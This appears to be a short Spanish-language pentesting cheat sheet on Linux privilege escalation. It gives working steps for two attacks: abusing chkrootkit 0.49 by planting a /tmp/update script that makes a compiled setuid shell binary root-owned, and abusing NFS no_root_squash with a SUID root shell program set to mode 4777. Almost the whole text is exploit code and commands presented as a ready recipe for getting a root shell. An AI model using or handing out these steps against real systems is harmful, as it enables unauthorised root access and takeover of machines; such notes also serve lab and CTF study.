Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
	cat << EOF > rootme.c
	> int main(void)
	> {
	>     setgid(0);
	>     setuid(0);
	>     execl("/bin/sh", "sh", 0);
	> }
	> EOF
Compilamos y guardamos en /tmp

Y luego en /tmp creamos el archivo update que se ejecutará como root
	cat << EOF > update
	> #!/bin/bash
	> chown root /tmp/rootme ; chgrp root /tmp/rootme ; chmod u+s /tmp/rootme
	> EOF

Finalmente ejecutamos rootme y obtenemos shell root

-------------------------------------------------------------------------------------------------------------------------------------------------------

Con NFS no_root_squash ->

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main() {

	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}

Ponerle propietario root y SUID desde nuestro terminal, no la shell
chown root:root archivo
chmod 4777 archivo
Ejecutarlo


Para elevar privilegios usar siempre /bin/sh en vez de /bin/bash
